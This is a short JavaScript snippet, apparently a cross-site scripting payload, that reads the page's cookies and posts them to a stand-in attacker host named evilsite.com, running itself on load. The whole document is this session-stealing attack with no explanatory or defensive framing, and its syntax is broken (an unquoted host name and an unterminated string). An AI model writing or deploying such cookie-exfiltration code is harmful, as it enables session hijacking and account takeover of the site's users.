var target = evilsite.com;

function sessionSteal(){
	var xhttp = new XMLHttpRequest();
  var text = document.cookie;
	xhttp.open("POST", "http://" + target + "/, true);
	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	xhttp.send(text);
}

sessionSteal();
